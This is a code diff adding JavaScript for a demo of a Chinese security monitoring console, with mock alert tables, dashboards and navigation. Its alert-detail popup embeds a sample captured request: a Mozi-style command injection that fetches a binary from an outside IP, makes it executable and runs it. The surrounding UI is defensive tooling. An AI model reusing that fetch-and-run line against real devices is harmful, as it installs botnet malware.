+  {t:'日志检索',href:'#/log-search',icon:'menu-logsearch.png'},
+  {t:'行为分析',href:'#/log-search',icon:'menu-behavior.png',children:[
+    {t:'DNS服务分析',href:'#/todo:DNS服务分析'},{t:'非常规服务分析',href:'#/todo:非常规服务分析'},
+    {t:'邮件行为分析',href:'#/todo:邮件行为分析'},{t:'登录行为分析',href:'#/todo:登录行为分析'},
+    {t:'WEB服务器行为分析',href:'#/todo:WEB服务器行为分析'},{t:'数据库行为分析',href:'#/todo:数据库行为分析'},
+    {t:'访问行为分析',href:'#/todo:访问行为分析'},{t:'黑IP行为分析',href:'#/todo:黑IP行为分析'},
+    {t:'旁路阻断行为分析',href:'#/todo:旁路阻断行为分析'}]},
+  {t:'全包取证分析',href:'#/todo:全包取证分析',icon:'menu-forensic.png'},
+  {t:'天眼狩猎',href:'#/todo:天眼狩猎',icon:'menu-hunting.png'},
+  {t:'攻击源IP预警',href:'#/todo:攻击源IP预警',icon:'menu-ipsource.png'}
+ ],
+ asset:[
+  {t:'资产',href:'#/asset-manage',icon:'menu-asset.png',children:[
+    {t:'资产管理',href:'#/asset-manage'},{t:'资产发现',href:'#/todo:资产发现'},
+    {t:'资产互访',href:'#/todo:资产互访'},{t:'IP地址管理',href:'#/todo:IP地址管理'}]},
+  {t:'脆弱性',href:'#/todo:脆弱性',icon:'menu-vuln.png'},
+  {t:'配置核查',href:'#/todo:配置核查',icon:'menu-config.png'},
+  {t:'补天漏洞',href:'#/todo:补天漏洞',icon:'menu-butian.png'}
+ ],
+ report:[
+  {t:'快速报表',href:'#/report',icon:'menu-report.png'},
+  {t:'周期报表',href:'#/todo:周期报表',icon:'menu-period.png'},
+  {t:'报表模板',href:'#/todo:报表模板',icon:'menu-template.png'}
+ ],
+ more:[
+  {t:'安全服务',href:'#/tools',icon:'menu-secure.png',children:[{t:'服务记录',href:'#/todo:服务记录'},{t:'安全工具',href:'#/tools'}]},
+  {t:'扩展程序',href:'#/todo:扩展程序配置',icon:'menu-ext.png',children:[{t:'扩展程序配置',href:'#/todo:扩展程序配置'},{t:'告警分析',href:'#/todo:告警分析'}]},
+  {t:'第三方日志',href:'#/todo:第三方日志',icon:'menu-third.png'}
+ ]
+};
+function sidebarFor(route){
+  if(['/dashboard','/system-monitor','/workbench','/situation','/situation-pro'].indexOf(route)>=0)return'monitor';
+  if(route.indexOf('/alert')===0||['/mining','/threat-intel','/asset-view','/attacker-view'].indexOf(route)>=0)return'threat';
+  if(route.indexOf('/log')===0)return'analysis';
+  if(route.indexOf('/asset')===0)return'asset';
+  if(route.indexOf('/report')===0)return'report';
+  if(route.indexOf('/tools')===0)return'more';
+  return'monitor';
+}
+function renderSidebar(route){
+  var sec=sidebarFor(route),items=SIDEBARS[sec],h='';
+  var IC=function(n){return '<img src="assets/ty/'+n+'" style="height:18px;width:auto;flex:0 0 auto;min-width:18px;max-width:22px;object-fit:contain;vertical-align:middle;display:inline-block">'};
+  items.forEach(function(it){
+    var active=it.href===('#'+route);
+    if(it.children){
+      var childActive=it.children.some(function(c){return c.href===('#'+route)});
+    if(!childActive && sec==='analysis' && it.t==='行为分析') childActive=true;
+      h+='<div class="side-item'+(childActive?' open':'')+'" onclick="toggleSub(this)">'+IC(it.icon)+it.t+'<span class="arr">▼</span></div>';
+      h+='<div class="side-sub" style="display:'+(childActive?'block':'none')+'">';
+      it.children.forEach(function(c){
+        h+='<a class="sub-item'+(c.href===('#'+route)?' active':'')+'" onclick="navTo(\''+c.href+'\')">'+c.t+'</a>';
+      });
+      h+='</div>';
+    }else{
+      h+='<div class="side-item'+(active?' active':'')+'" onclick="navTo(\''+it.href+'\')">'+IC(it.icon)+it.t+'</div>';
+    }
+  });
+  document.getElementById('sidebar').innerHTML=h;
+}
+function toggleSub(el){
+  el.classList.toggle('open');
+  var sub=el.nextElementSibling;
+  sub.style.display=sub.style.display==='none'?'block':'none';
+}
+
+/* ============ 面包屑 ============ */
+var CRUMB={
+ '/dashboard':['监测中心','仪表板'],'/system-monitor':['监测中心','系统运行监控'],'/workbench':['监测中心','监测工作台'],
+ '/situation':['监测中心','态势感知'],'/situation-pro':['监测中心','态势感知高级版'],
+ '/alert-traffic':['威胁感知','告警列表','流量传感器'],'/alert-mail':['威胁感知','告警列表','邮件威胁检测系统'],
+ '/alert-all':['威胁感知','告警列表','全部'],'/alert-file':['威胁感知','告警列表','文件威胁鉴定器'],
+ '/alert-honeypot':['威胁感知','告警列表','攻击诱捕系统'],'/alert-smac':['威胁感知','告警列表','智慧管理分析系统(SMAC)'],
+ '/alert-yunsuo':['威胁感知','告警列表','服务器安全管理系统(云锁)'],'/alert-soar':['威胁感知','告警列表','SOAR自动化编排场景'],
+ '/mining':['威胁感知','威胁视角','挖矿专项'],'/threat-intel':['威胁感知','威胁视角','威胁情报'],
+ '/asset-view':['威胁感知','资产视角'],'/attacker-view':['威胁感知','攻击者视角'],
+ '/log-search':['分析中心','日志检索'],'/asset-manage':['资产感知','资产','资产管理'],
+ '/report':['报表报告','快速报表'],'/tools':['更多','安全服务','安全工具']
+};
+function renderCrumb(route){
+  var c=CRUMB[route]||['演示','敬请期待'];
+  var h='';
+  c.forEach(function(x,i){h+=(i?'<span class="sep">›</span>':'')+'<span class="'+(i===c.length-1?'cur':'')+'">'+x+'</span>'});
+  document.getElementById('crumb').innerHTML=h;
+}
+
+/* ============ 流量传感器 43 条告警数据 ============ */
+var ALERTS=[
+ ['2022-08-08 01:42:19','120.76.40.171','10.17.0.227','10.17.0.227','【攻击利用】弱口令','Web弱口令登录','企图','高危',48],
+ ['2022-08-08 01:42:09','42.96.202.139','10.17.0.227','10.17.0.227','【攻击利用】弱口令','Web弱口令登录','企图','高危',48],
+ ['2022-08-08 01:42:08','10.0.5.11','','10.0.5.11','【攻击利用】代理工具','发现远程连接工具To…','企图','中危',10],
+ ['2022-08-08 01:41:59','123.206.53.248','10.17.0.227','10.17.0.227','【攻击利用】弱口令','Web弱口令登录','企图','高危',88],
+ ['2022-08-08 01:41:49','123.206.22.158','10.17.0.227','10.17.0.227','【攻击利用】弱口令','Web弱口令登录','企图','高危',82],
+ ['2022-08-08 01:41:44','42.96.130.98','10.17.0.227','10.17.0.227','【攻击利用】弱口令','Web弱口令登录','企图','高危',47],
+ ['2022-08-08 01:41:36','120.181.53.219','10.29.0.13','10.29.0.13','【攻击利用】信息泄露','发现敏感信息文件的…','失败','低危',3],
+ ['2022-08-08 01:41:34','123.206.55.91','10.17.0.227','10.17.0.227','【攻击利用】弱口令','Web弱口令登录','企图','高危',47],
+ ['2022-08-08 01:41:32','27.185.201.150','10.85.23.175','10.85.23.175','【攻击利用】信息泄露','发现敏感信息文件的…','失败','低危',4],
+ ['2022-08-08 01:40:21','10.131.11.2','','10.131.11.2','【攻击利用】代理工具','发现远程连接工具To…','企图','中危',5]
+];
+(function(){
+  // 补足 33 条（高危再 4、中危再 14、低危再 15），时间递减，样式与可见行一致
+  var ips=['112.10.88.24','45.192.22.101','183.14.55.90','91.240.118.152','104.236.8.77','61.140.190.23','222.186.42.130','5.188.206.45','89.248.165.12','176.32.120.88'];
+  var victims=['10.17.0.227','10.0.5.11','10.29.0.13','10.85.23.175','10.131.11.2','10.0.11.2','10.0.6.81'];
+  var plan=[['高危',4],['中危',14],['低危',15]];
+  var t=Date.parse('2022-08-08T01:40:00')-60000;
+  var k=0;
+  plan.forEach(function(p){
+    for(var i=0;i<p[1];i++){
+      var lv=p[0],v=victims[k%victims.length],attacker=ips[k%ips.length];
+      var type = lv==='高危'?['【攻击利用】弱口令','Web弱口令登录']:(lv==='中危'?['【攻击利用】代理工具','发现远程连接工具To…']:['【攻击利用】信息泄露','发现敏感信息文件的…']);
+      var res = lv==='低危'?'失败':'企图';
+      var d=new Date(t-k*97000);
+      ALERTS.push([fmt(d),attacker,(k%3===2?'':v),v,type[0],type[1],res,lv,3+((k*7)%90)]);
+      k++;
+    }
+  });
+  function fmt(d){function z(n){return (n<10?'0':'')+n}return '2022-08-08 '+z(d.getHours())+':'+z(d.getMinutes())+':'+z(d.getSeconds())}
+})();
+/* ============ 通用渲染组件 ============ */
+function lvTag(lv){
+  var m={'高危':'tag-high','中危':'tag-mid','低危':'tag-low','危急':'tag-urgent'};
+  return '<span class="tag '+(m[lv]||'tag-info')+'">'+lv+'</span>';
+}
+function resTag(r){return r==='失败'?'<span class="tag tag-fail">失败</span>':'<span class="tag tag-attempt">企图</span>'}
+function pagerHTML(total,page,size,cb){
+  var pages=Math.max(1,Math.ceil(total/size)),h='';
+  h+='<span>共 '+total+' 条</span>';
+  h+='<select onchange="'+cb+'Size(this.value)"><option>'+size+'条/页</option><option>20条/页</option><option>40条/页</option></select>';
+  h+='<button class="pg-btn" '+(page<=1?'disabled':'')+' onclick="'+cb+'Go('+(page-1)+')">‹</button>';
+  for(var i=1;i<=pages;i++){h+='<button class="pg-btn'+(i===page?' on':'')+'" onclick="'+cb+'Go('+i+')">'+i+'</button>'}
+  h+='<button class="pg-btn" '+(page>=pages?'disabled':'')+' onclick="'+cb+'Go('+(page+1)+')">›</button>';
+  h+='<span class="jump">前往 <input value="'+page+'" id="pgJump"> 页 <button class="pg-btn" onclick="'+cb+'Jump()">确定</button></span>';
+  return '<div class="pager">'+h+'</div>';
+}
+function emptyHTML(txt){
+  txt=txt||'暂无数据';
+  return '<div class="empty"><div class="ico"><img src="assets/ty/empty-search.png" style="width:120px;height:auto;display:block;margin:0 auto"></div>'+txt+'</div>';
+}
+/* 空态页（无截图菜单落地） */
+function genericEmpty(title){
+  return '<div class="card"><div class="card-title">'+esc(title)+'</div><div class="card-body" style="padding:60px 16px">'+emptyHTML('演示页面，敬请期待')+'</div></div>';
+}
+
+/* ============ 视图：告警列表（流量传感器 / 其他来源复用） ============ */
+var alertState={page:1,size:10,tab:'全部告警'};
+function renderAlertTraffic(){
+  var v=document.getElementById('view');
+  v.innerHTML=
+  '<div style="display:flex;align-items:center;gap:10px;margin-bottom:12px">'+
+    '<div style="flex:1;display:flex;gap:8px">'+
+      '<div class="tabs" style="flex:1;padding:0" id="alertTabs">'+
+        '<a class="tab active" onclick="alertTab(this,\'全部告警\')">全部告警</a>'+
+        '<a class="tab" onclick="alertTab(this,\'未处置告警\')">未处置告警<span class="lv">高级</span></a>'+
+        '<a class="tab" onclick="alertTab(this,\'webshell管理工具告警\')">webshell管理工具告警<span class="lv">高级</span></a>'+
+        '<a class="tab" onclick="alertTab(this,\'文件上传成功告警\')">文件上传成功告警</a>'+
+        '<a class="tab" onclick="alertTab(this,\'文件上传企图告警\')">文件上传企图告警</a>'+
+        '<a class="tab" onclick="alertTab(this,\'木马通信类告警\')">木马通信类告警</a>'+
+        '<a class="tab" onclick="alertTab(this,\'代码执行成功告警\')">代码执行成功告警</a>'+
+      '</div>'+
+    '</div>'+
+    '<a class="link" style="white-space:nowrap" onclick="toast('+"'"+'自定义检索场景（演示）'+"'"+')">自定义检索场景 ▾</a>'+
+  '</div>'+
+  '<div class="query-row" style="padding-bottom:10px">'+
+    '<div style="flex:1;display:flex;align-items:center;border:1px solid #d4dae3;border-radius:3px;height:34px">'+
+      '<img src="assets/ty/i-search.png" style="height:16px;width:auto;margin:0 8px;object-fit:contain;vertical-align:middle">'+
+      '<input style="flex:1;border:none;height:32px;padding:0 10px" placeholder="输入高级表达式，例如：attack_sip = \'1.1.1.1\' AND threat_type = IN (\'APT事件\',\'端口扫描\')">'+
+      '<img src="assets/ty/i-funnel.png" style="height:16px;width:auto;margin:0 8px;object-fit:contain;vertical-align:middle">'+
+      '<button class="btn sm" style="height:32px;border-radius:0 3px 3px 0" onclick="toast(\'查询完成（演示）\')">查 询</button>'+
+      '<span style="display:flex;border:1px solid #d4dae3;border-radius:3px;margin-left:8px;overflow:hidden">'+
+        '<button style="width:36px;height:32px;border:none;background:#fff;cursor:pointer" onclick="toast(\'刷新（演示）\')"><img src="assets/ty/i-refresh.png" style="height:16px;width:auto;vertical-align:middle"></button>'+
+        '<button style="width:36px;height:32px;border:none;background:#f0f3f8;cursor:pointer" onclick="toast(\'保存（演示）\')"><img src="assets/ty/i-save.png" style="height:16px;width:auto;vertical-align:middle"></button>'+
+        '<button style="width:36px;height:32px;border:none;background:#fff;cursor:pointer" onclick="toast(\'历史（演示）\')"><img src="assets/ty/i-clock.png" style="height:16px;width:auto;vertical-align:middle"></button>'+
+        '<button style="width:36px;height:32px;border:none;background:#fff;cursor:pointer" onclick="toast(\'展开（演示）\')"><img src="assets/ty/i-chevron.png" style="height:16px;width:auto;vertical-align:middle"></button>'+
+        '<button style="width:36px;height:32px;border:none;background:#fff;cursor:pointer" onclick="toast(\'文档检索（演示）\')"><img src="assets/ty/i-docsearch.png" style="height:16px;width:auto;vertical-align:middle"></button>'+
+      '</span>'+
+    '</div>'+
+  '</div>'+
+  '<div class="query-row">'+
+    '<div class="q-item"><label>受害IP</label><input placeholder="*进行模糊匹配"></div>'+
+    '<div class="q-item"><label>攻击IP</label><input placeholder="*进行模糊匹配"></div>'+
+    '<div class="q-item"><label>告警类型</label><select><option>请选择</option></select></div>'+
+    '<div class="q-item"><label>告警设备</label><select><option>请选择</option></select></div>'+
+    '<div class="q-item"><label>威胁级别</label><select><option>请选择</option></select></div>'+
+  '</div>'+
+  '<div class="stat-bar">'+
+    '<span>共计 <b>43</b> 条告警</span>'+
+    '<span class="st"><img src="assets/ty/sh-critical.png" style="height:16px;width:auto;vertical-align:middle">危急：<b>0</b> 条</span>'+
+    '<span class="st"><img src="assets/ty/sh-high.png" style="height:16px;width:auto;vertical-align:middle">高危：<b>10</b> 条</span>'+
+    '<span class="st"><img src="assets/ty/sh-mid.png" style="height:16px;width:auto;vertical-align:middle">中危：<b>16</b> 条</span>'+
+    '<span class="st"><img src="assets/ty/sh-low.png" style="height:16px;width:auto;vertical-align:middle">低危：<b>17</b> 条</span>'+
+    '<span class="st"><img src="assets/ty/sh-unread.png" style="height:16px;width:auto;vertical-align:middle">未读告警：<b>34</b> 条</span>'+
+    '<div style="margin-left:auto;width:220px;height:34px" id="alertTrend"></div>'+
+  '</div>'+
+  '<div style="display:flex;gap:8px;margin-bottom:12px">'+
+    '<button class="btn sm" onclick="toast(\'事件提交（演示）\')">事件提交</button>'+
+    '<button class="btn sm plain" onclick="toast(\'自定义标签（演示）\')">自定义标签</button>'+
+    '<button class="btn sm plain" onclick="toast(\'标记已读（演示）\')">标记已读</button>'+
+    '<button class="btn sm plain" onclick="toast(\'标记未读（演示）\')">标记未读</button>'+
+    '<button class="btn sm plain" onclick="toast(\'更多操作\')">···</button>'+
+    '<span style="margin-left:auto;display:flex;align-items:center;gap:8px"><button class="btn sm" onclick="toast(\'导出中（演示）\')">导出</button><button style="width:32px;height:32px;border:1px solid #d4dae3;border-radius:3px;background:#fff;cursor:pointer" onclick="toast(\'列表视图（演示）\')"><img src="assets/ty/i-export.png" style="height:16px;width:auto;vertical-align:middle"></button></span>'+
+  '</div>'+
+  '<div class="tbl-wrap" id="alertTable"></div>';
+  renderAlertTable();
+  // 趋势小图
+  var el=document.getElementById('alertTrend');
+  mkChart(el,{grid:{left:0,right:0,top:2,bottom:0},xAxis:{type:'category',show:false,data:[1,2,3,4,5,6,7]},yAxis:{type:'value',show:false},series:[{type:'line',data:[30,45,38,52,40,58,44],smooth:true,showSymbol:false,lineStyle:{color:'#F5443D',width:1.5},areaStyle:{color:'rgba(245,68,61,.25)'}}]});
+}
+function alertTab(el,name){
+  document.querySelectorAll('#alertTabs .tab').forEach(function(t){t.classList.remove('active')});
+  el.classList.add('active');
+  alertState.tab=name;alertState.page=1;
+  if(name!=='全部告警'){document.getElementById('alertTable').innerHTML=emptyHTML('当前分类暂无数据')}
+  else renderAlertTable();
+}
+function renderAlertTable(){
+  var start=(alertState.page-1)*alertState.size,rows=ALERTS.slice(start,start+alertState.size);
+  var h='<table class="tbl"><colgroup>'+
+    '<col style="width:34px"><col style="width:130px"><col style="width:100px"><col style="width:100px"><col style="width:100px"><col style="width:115px"><col style="width:140px"><col style="width:64px"><col style="width:62px"><col style="width:48px"><col style="width:150px"></colgroup>'+
+    '<thead><tr><th><input type="checkbox"></th><th>最近发生时间 ↕</th><th>受害IP ↕</th><th>攻击IP ↕</th><th>资产IP ↕</th><th>告警类型</th><th>威胁名称 ↕</th><th>攻击结果 ↕</th><th>威胁级别 ↕</th><th>次数 ↕</th><th>操作</th></tr></thead><tbody>';
+  rows.forEach(function(r){
+    h+='<tr>'+
+    '<td><input type="checkbox"></td>'+
+    '<td class="mono">'+r[0]+'</td>'+
+    '<td class="ip">'+(r[2]?'<span class="link mono">'+r[1]+'</span>':'<span class="mono">'+r[1]+'</span>')+'</td>'+
+    '<td class="ip">'+(r[2]?'<span class="mono" style="background:#E8F1FD;padding:1px 4px">'+r[2]+'</span>':'')+'</td>'+
+    '<td class="ip">'+r[3]+'</td>'+
+    '<td>'+r[4]+'</td>'+
+    '<td title="'+r[5]+'">'+r[5]+'</td>'+
+    '<td>'+resTag(r[6])+'</td>'+
+    '<td>'+lvTag(r[7])+'</td>'+
+    '<td>'+r[8]+'</td>'+
+    '<td class="ops"><a onclick="openDetail()">详情</a><a onclick="toast(\'处置（演示）\')">处置</a><a onclick="toast(\'已加白（演示）\')">加白</a><a onclick="toast(\'智能研判（演示）\')">智能研判</a></td>'+
+    '</tr>';
+  });
+  h+='</tbody></table>'+pagerHTML(43,alertState.page,alertState.size,'alertPg');
+  document.getElementById('alertTable').innerHTML=h;
+}
+function alertPgGo(p){alertState.page=p;renderAlertTable()}
+function alertPgSize(s){alertState.size=parseInt(s);alertState.page=1;renderAlertTable()}
+function alertPgJump(){var p=parseInt(document.getElementById('pgJump').value);if(p>=1&&p<=5)alertPgGo(p)}
+
+/* ============ 告警详情弹窗 ============ */
+function openDetail(){
+  document.getElementById('adBody').innerHTML=
+  '<div class="ad-section"><div class="ad-grid">'+
+   '<div class="cell"><div class="k">告警时间</div><div class="v mono">2022-08-08 00:12:15</div></div>'+
+   '<div class="cell"><div class="k">威胁级别</div><div class="v"><span class="tag tag-high">高危</span></div></div>'+
+   '<div class="cell"><div class="k">攻击IP</div><div class="v mono">113.218.243.41</div></div>'+
+   '<div class="cell"><div class="k">受害IP</div><div class="v mono">10.0.11.2</div></div>'+
+   '<div class="cell"><div class="k">告警类型</div><div class="v">【攻击利用】命令执行</div></div>'+
+   '<div class="cell"><div class="k">威胁名称</div><div class="v">Shell命令执行(机器学习)</div></div>'+
+   '<div class="cell"><div class="k">源MAC地址</div><div class="v mono">00:00:5e:00:01:28</div></div>'+
+   '<div class="cell"><div class="k">目的MAC地址</div><div class="v mono">00:10:db:ff:20:a0</div></div>'+
+   '<div class="cell"><div class="k">告警次数</div><div class="v">1</div></div>'+
+   '<div class="cell"><div class="k">状态</div><div class="v"><span style="color:#2E7BD6">●</span> 已处置</div></div>'+
+   '<div class="cell"><div class="k">告警设备</div><div class="v">天眼探针</div></div>'+
+   '<div class="cell"><div class="k">告警设备IP</div><div class="v mono">10.0.6.81</div></div>'+
+   '<div class="cell"><div class="k">规则ID</div><div class="v mono">0x10020b6e</div></div>'+
+   '<div class="cell"><div class="k">攻击阶段</div><div class="v">入侵</div></div>'+
+   '<div class="cell"><div class="k">XFF代理</div><div class="v"></div></div>'+
+   '<div class="cell"><div class="k">攻击结果</div><div class="v"><span class="tag tag-fail">失败</span></div></div>'+
+   '<div class="cell"><div class="k">硬件类型</div><div class="v"></div></div>'+
+   '<div class="cell"><div class="k">操作系统</div><div class="v"></div></div>'+
+   '<div class="cell"><div class="k">设备</div><div class="v"></div></div>'+
+   '<div class="cell"><div class="k">软件</div><div class="v"></div></div>'+
+  '</div></div>'+
+  '<div class="ad-section"><h5>五元组信息</h5><div class="ad-grid">'+
+   '<div class="cell"><div class="k">源IP</div><div class="v mono">113.218.243.41</div></div>'+
+   '<div class="cell"><div class="k">目的IP</div><div class="v mono">10.0.11.2 <span class="tag tag-info">内部IP</span></div></div>'+
+   '<div class="cell"><div class="k">源端口</div><div class="v mono">59216</div></div>'+
+   '<div class="cell"><div class="k">目的端口</div><div class="v mono">80</div></div>'+
+   '<div class="cell"><div class="k">源地理信息</div><div class="v mono">中国--湖南省--长沙市 (28.211238/112.967240)</div></div>'+
+   '<div class="cell"><div class="k">目的地理信息</div><div class="v mono">中国--北京市 (39.938884/116.397459)</div></div>'+
+   '<div class="cell"><div class="k">协议</div><div class="v"></div></div>'+
+   '<div class="cell"><div class="k">VLAN</div><div class="v"></div></div>'+
+  '</div></div>'+
+  '<div class="ad-section"><h5>请求头</h5><div class="ad-code">GET /shell?cd+/tmp/;rm+-rf+;wget+http://113.218.243.41:45271/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1\nUser-Agent: Hello, world\nHost: 36.110.67.148:80\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nConnection: keep-alive</div></div>'+
+  '<div class="ad-section"><h5>响应头</h5><div class="ad-code">HTTP/1.1 200 OK\nServer: nginx\nDate: Mon, 08 Aug 2022 00:12:15 GMT\nContent-Type: text/html</div></div>';
+  document.getElementById('alertDetail').classList.add('open');
+  document.getElementById('modalMask').classList.add('open');
+}
+function closeDetail(){
+  document.getElementById('alertDetail').classList.remove('open');
+  document.getElementById('modalMask').classList.remove('open');
+}
+/* ============ 视图：仪表板 ============ */
+function renderDashboard(){
+  document.getElementById('view').innerHTML=
+  '<div class="card"><div class="card-title">告警统计 <span style="margin-left:auto;font-weight:400;font-size:12px;color:#8a94a3;display:flex;gap:12px;align-items:center">'+
+  '<select style="height:28px;border:1px solid #d4dae3;border-radius:3px"><option>告警统计：默认</option></select>'+
+  '<select style="height:28px;border:1px solid #d4dae3;border-radius:3px"><option>今天</option></select>'+
+  '<select style="height:28px;border:1px solid #d4dae3;border-radius:3px"><option>告警攻击阶段统计</option></select>'+
+  '<label style="display:flex;align-items:center;gap:4px;cursor:pointer"><input type="checkbox" checked>自动刷新</label></span></div>'+
+  '<div class="card-body">'+
+    '<div style="font-weight:600;margin-bottom:12px">整体视图</div>'+
+    '<div class="stat-cards">'+
+      '<div class="g-card gc-1"><div class="gc-label">风险等级</div><div class="gc-main">低危</div><div class="gc-sub">风险评分 7</div><img class="gc-ico" src="assets/ty/card-doc.png"></div>'+
+      '<div class="g-card gc-2"><div class="gc-label">总告警数量</div><div class="gc-main">5042 条</div><div class="gc-sub">攻击成功 0 (0%)</div><img class="gc-ico" src="assets/ty/card-recycle.png"></div>'+
+      '<div class="g-card gc-3"><div class="gc-label">受害资产数量</div><div class="gc-main">53 个</div><div class="gc-sub">失陷数量 0 (0%)</div><img class="gc-ico" src="assets/ty/card-server.png"></div>'+
+      '<div class="g-card gc-4"><div class="gc-label">攻击者数量</div><div class="gc-main">6 个</div><div class="gc-sub">境外 1 (16.67%)</div><img class="gc-ico" src="assets/ty/card-shield.png"></div>'+
+    '</div>'+
+  '</div></div>'+
+  '<div class="row2">'+
+    '<div class="card"><div class="card-title">外部攻击</div><div class="card-body"><div class="mini2">'+
+      '<div class="mini-cell"><div class="mc-ico"><img src="assets/ty/mini-ext-alert.png" style="width:34px;height:34px;border-radius:50%"></div><b>0 条</b><div class="mc-sub">外部攻击告警 · 攻击成功 0 (0%)</div></div>'+
+      '<div class="mini-cell"><div class="mc-ico"><img src="assets/ty/mini-ext-asset.png" style="width:34px;height:34px;border-radius:50%"></div><b>0 个</b><div class="mc-sub">受外部攻击资产数量 · 失陷数量 0 (0%)</div></div>'+
+    '</div></div></div>'+
+    '<div class="card"><div class="card-title">外联攻击</div><div class="card-body"><div class="mini2">'+
+      '<div class="mini-cell"><div class="mc-ico"><img src="assets/ty/mini-out-alert.png" style="width:34px;height:34px;border-radius:50%"></div><b>0 条</b><div class="mc-sub">外联攻击告警 · 攻击成功 0 (0%)</div></div>'+
+      '<div class="mini-cell"><div class="mc-ico"><img src="assets/ty/mini-out-asset.png" style="width:34px;height:34px;border-radius:50%"></div><b>0 个</b><div class="mc-sub">发起外联攻击资产数量 · 失陷数量 0 (0%)</div></div>'+
+    '</div></div></div>'+
+    '<div class="card"><div class="card-title">告警类型分布</div><div class="card-body ring-wrap">'+
+      '<div id="dashDonut" style="width:180px;height:180px"></div>'+
+      '<div class="ring-legend" id="dashLegend"></div>'+
+    '</div></div>'+
+  '</div>'+
+  '<div class="row2" style="grid-template-columns:1fr 1fr 1.6fr">'+
+    '<div class="card"><div class="card-title">告警环比</div><div class="card-body huanbi">'+
+      '<div class="hb"><div class="t">今天 <span class="up">▼ 11.48 万次</span></div><div class="v">5334 <small>次</small></div></div>'+
+      '<div class="hb"><div class="t">本周 <span class="up">▼ 81.58 万次</span></div><div class="v">5334 <small>次</small></div></div>'+
+    '</div></div>'+
+    '<div class="card"><div class="card-title">横向攻击</div><div class="card-body"><div class="mini2">'+
+      '<div class="mini-cell"><div class="mc-ico"><img src="assets/ty/mini-lat-alert.png" style="width:34px;height:34px;border-radius:50%"></div><b>0 条</b><div class="mc-sub">横向攻击告警 · 攻击成功 0 (0%)</div></div>'+
+      '<div class="mini-cell"><div class="mc-ico"><img src="assets/ty/mini-lat-asset.png" style="width:34px;height:34px;border-radius:50%"></div><b>0 个</b><div class="mc-sub">受横向攻击资产数量 · 失陷数量 0 (0%)</div></div>'+
+    '</div></div></div>'+
+    '<div class="card"><div class="card-title"></div><div class="card-body" style="visibility:hidden">占位</div></div>'+
+  '</div>'+
+  '<div class="card"><div class="card-title">告警类型数量统计(1)</div>'+
+    '<div style="display:grid;grid-template-columns:repeat(10,1fr);padding:10px 16px 0;font-size:12.5px;color:#0B66C7">'+
+      ['APT事件(0)','攻击利用(0)','恶意软件(0)','拒绝服务(0)','侦察(0)','可疑活动(0)','策略(0)','系统(0)','应用程序(0)','认证(0)'].map(function(x){return '<div style="padding:6px 0">'+x+'</div>'}).join('')+
+    '</div>'+
+    '<div style="display:grid;grid-template-columns:repeat(10,1fr);padding:0 16px 14px;font-size:12.5px;color:#8a94a3">'+
+      ['其他APT事件(0)','信息泄露(0)','挖矿病毒(0)','用户自定义(0)','用户自定义(0)','可疑IP地址(0)','用户自定义(0)','用户自定义(0)','其他应用程序(0)','用户自定义(0)'].map(function(x){return '<div style="padding:6px 0">'+x+'</div>'}).join('')+
+    '</div>'+
+  '</div>';
+  // donut
+  var types=['可疑活动','策略','拒绝服务','攻击利用','恶意软件','系统','应用程序','认证','APT事件','侦察','网络访问'];
+  var colors=['#7B5CD6','#2E86E8','#5BB8F5','#8B5CF6','#C96BE8','#F0A8C8','#E85A9E','#E85A7A','#5A7BD6','#F5A623','#C9565A'];
+  var legendHtml='';
+  types.forEach(function(t,i){legendHtml+='<div class="rl"><i style="background:'+colors[i]+'"></i>'+t+'<span>- 0%</span></div>'});
+  document.getElementById('dashLegend').innerHTML=legendHtml;
+  mkChart(document.getElementById('dashDonut'),{series:[{type:'pie',radius:['58%','78%'],center:['50%','50%'],label:{show:false},data:types.map(function(t,i){return {name:t,value:1,itemStyle:{color:colors[i]}}})}]});
+}
+
+/* ============ 视图：系统运行监控（SVG 拓扑） ============ */
+function renderTopology(){
+  document.getElementById('view').innerHTML=
+  '<div class="card" style="padding:0"><img src="assets/ty/topo-full.png" style="width:100%;display:block"></div>';
+}
+
+/* ============ 视图：监测工作台 ============ */
+function renderWorkbench(){
+  document.getElementById('view').innerHTML=
+  '<div class="card" style="padding:12px 16px"><b style="font-size:14px">重点监测</b> <span style="color:#8a94a3;font-size:12px">(?)</span>'+
+  '<img src="assets/ty/workbench-cards.png" style="width:100%;display:block;margin-top:8px;cursor:pointer" onclick="navTo(\'#/alert-traffic\')"></div>'+
+  '<div class="query-row">'+
+    '<div class="q-item"><label>资产名称</label><input></div>'+
+    '<div class="q-item"><label>登录资产IP</label><input></div>'+
+    '<div class="q-item"><label>处理状态</label><select><option>未处置</option><option>已处置</option></select></div>'+
+    '<div class="q-item"><label>白名单</label><select><option>否</option><option>是</option></select></div>'+
+    '<span style="margin-left:auto"><button class="btn" onclick="toast(\'查询完成（演示）\')">查询</button></span>'+
+  '</div>'+
+  '<div class="card"><div style="display:flex;gap:30px;padding:10px 16px;border-bottom:1px solid #eef1f6">'+
+    '<span style="color:#0B66C7;font-size:14px;display:flex;align-items:center;gap:6px">资产安全状态分布</span>'+
+    '<span style="color:#555;cursor:pointer" onclick="toast(\'切换到风险资产TOP10\')">风险资产TOP10</span>'+
+  '</div>'+
+  '<div class="split2" style="padding:30px 16px">'+
+    '<div id="wbFunnel" style="height:220px"></div>'+
+    '<div style="display:flex;align-items:center;justify-content:center"><img src="assets/ty/empty-search.png" style="width:160px;opacity:.6"></div>'+
+  '</div></div>'+
+  '<div class="tbl-wrap" style="margin-top:14px">'+
+    '<div style="display:flex;justify-content:flex-end;padding:10px 12px"><button class="btn sm" onclick="toast(\'导出中（演示）\')">导出</button></div>'+
+    '<table class="tbl"><colgroup><col style="width:34px"><col><col><col><col><col><col><col><col></colgroup>'+
+    '<thead><tr><th></th><th>资产名称</th><th>风险值 ↕</th><th>登录资产IP</th><th>资产组</th><th>漏洞数</th><th>告警事件数</th><th>失陷状态</th><th>操作</th></tr></thead>'+
+    '<tbody><tr><td colspan="9">'+emptyHTML('暂无数据')+'</td></tr></tbody></table>'+
+    pagerHTML(0,1,10,'wbPg')+
+  '</div>';
+  mkChart(document.getElementById('wbFunnel'),{series:[{type:'funnel',left:'15%',width:'70%',gap:2,label:{show:true,position:'inside',color:'#fff',formatter:'{b} ({c})'},itemStyle:{color:'#9CC8F5'},data:[{name:'系统',value:21},{name:'内部IP',value:21}]}]});
+}
+function wbPgGo(){}function wbPgSize(){}function wbPgJump(){}
+/* ============ 视图：态势感知（深色大屏，整裁图） ============ */
